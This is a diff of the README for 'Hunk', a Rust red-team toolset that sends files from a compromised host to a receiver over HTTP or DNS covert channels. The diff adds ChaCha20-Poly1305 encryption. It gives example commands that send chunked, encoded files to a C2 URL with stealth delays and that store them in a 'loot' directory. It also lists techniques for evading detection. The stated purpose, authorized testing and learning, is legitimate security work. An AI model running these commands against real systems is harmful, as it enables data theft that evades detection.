@@ -4,26 +4,27 @@
 
 Hunk is a small Cargo workspace implementing a client/server exfiltration research toolset. Its primary objective is twofold:
 - Provide a practical Rust learning project for networking, async, and systems programming.
-- Offer a controlled environment to study data exfiltration techniques used during authorized Red Team engagements (HTTP and DNS covert channels, chunking, and layered encoding).
+- Offer a controlled environment to study data exfiltration techniques used during authorized Red Team engagements (HTTP and DNS covert channels, chunking, layered encoding, and payload encryption).
 
 ## Project Structure
 
 hunk is organized as a workspace with two focused crates:
 
-- `runner/` — client-side agent that encodes and transmits file chunks
-- `shelter/` — server-side receiver that decodes, assembles, and persists files
+- `runner/` — client-side agent that encodes, optionally encrypts, and transmits file chunks
+- `shelter/` — server-side receiver that decodes, decrypts, assembles, and persists files
 - `Cargo.toml` — workspace manifest
 - `README.md` — this file (root)
 
 ### Runner (brief)
 
 Runner is a CLI agent that:
-- Reads files, encodes them (Base64 → hex) and splits them into chunks
+- Reads files, optionally encrypts them with ChaCha20-Poly1305 AEAD cipher
+- Encodes encrypted/plaintext data (Base64 → hex) and splits into chunks
 - Transmits chunks over HTTP POST or as DNS TXT subdomain queries (UDP/TCP)
-- Supports configurable chunk counts and inter-chunk delays for operational stealth
+- Supports configurable chunk counts, inter-chunk delays, and key management strategies
 
-Example (HTTP):
-cargo run --release -p runner -- exfil http --src-files /path/to/file.txt -u https://c2/receive --chunks 10 --delay 500
+Example (HTTP with encryption):
+cargo run --release -p runner -- exfil http --src-files /path/to/file.txt -u https://c2/receive --chunks 10 --delay 500 --cipher-key str=my_32_byte_encryption_key_here
 
 See `runner/README.md` for full usage and options.
 
@@ -31,23 +32,29 @@ See `runner/README.md` for full usage and options.
 
 Shelter is a receiver that:
 - Listens as an HTTP server (POST body payloads) or DNS authoritative server (subdomain payloads)
-- Decodes payloads (hex → Base64 → UTF-8), indexes chunks in-memory, and reassembles files when the final chunk arrives
+- Decodes payloads (hex → Base64 → UTF-8)
+- Decrypts encrypted payloads using provided ChaCha20-Poly1305 keys
+- Indexes chunks in-memory and reassembles files when the final chunk arrives
 - Persists reconstructed files to a configurable `loot` directory
 
-Example (HTTP):
-cargo run --release -p shelter -- http-server -l 0.0.0.0:8080 --output-dir ./loot
+Example (HTTP with encryption):
+cargo run --release -p shelter -- http-server -l 0.0.0.0:8080 --output-dir ./loot --cipher-key my_32_byte_encryption_key_here
 
 See `shelter/README.md` for detailed configuration and deployment options (including Docker).
 
 ## End-to-End Workflow
 
-1. Runner builds a root node (metadata) and file chunk nodes, encodes each node (Base64 → hex).
-2. Runner sends encoded nodes over HTTP POST or as DNS query subdomains to Shelter.
-3. Shelter decodes incoming nodes, enqueues them, and stores chunks in a sorted in-memory structure.
-4. When an end marker is received, Shelter assembles, hex-decodes, concatenates bytes, and writes the file to the loot directory.
+1. Runner reads a file and optionally encrypts it using ChaCha20-Poly1305 AEAD.
+2. Runner builds a root node (metadata) and file chunk nodes from the file/encrypted data.
+3. Runner encodes each node (Base64 → hex).
+4. Runner sends encoded nodes over HTTP POST or as DNS query subdomains to Shelter.
+5. Shelter decodes incoming nodes, decrypts if needed, enqueues them, and stores chunks in a sorted in-memory structure.
+6. When an end marker is received, Shelter assembles, decrypts, hex-decodes, concatenates bytes, and writes the file to the loot directory.
 
 Diagram:
-Compromised System (Runner) → HTTP/DNS → Shelter (Receiver) → Loot Directory
+Compromised System (Runner) → [HTTP/DNS] → Shelter (Receiver) → Loot Directory
+
+With optional payload encryption at both ends using ChaCha20-Poly1305.
 
 ## Building the Project
 
@@ -92,15 +99,17 @@ For development runs, use `cargo run --` with the component command (see example
 This project serves as a practical learning platform for:
 
 - **Rust fundamentals** — Async/await, error handling, CLI argument parsing, networking
-- **Cryptography & Encoding** — Base64, hex encoding, DNS protocol constraints
+- **Cryptography & Encoding** — Base64, hex encoding, ChaCha20-Poly1305 AEAD encryption, DNS protocol constraints
 - **Network Programming** — HTTP servers (Actix-web), DNS client/server implementation
 - **Systems Programming** — File I/O, process spawning, environment configuration
-- **Security Concepts** — Data exfiltration, covert channels, operational security
+- **Security Concepts** — Data exfiltration, covert channels, operational security, payload encryption
 
 ## Research Topics Covered
 
 - **Protocol-based Exfiltration** — Using HTTP and DNS as covert data channels
+- **Payload Encryption** — ChaCha20-Poly1305 AEAD cipher for authenticated encryption
 - **Encoding Obfuscation** — Nested encoding schemes to evade detection
+- **Key Management** — Multiple key retrieval strategies (hardcoded, file-based, URL-based)
 - **Asynchronous Processing** — Non-blocking I/O for high-performance data handling
 - **Error Resilience** — Handling incomplete/out-of-order data chunks
 - **Network Stealth** — Inter-packet delays and DNS tunneling for evasion
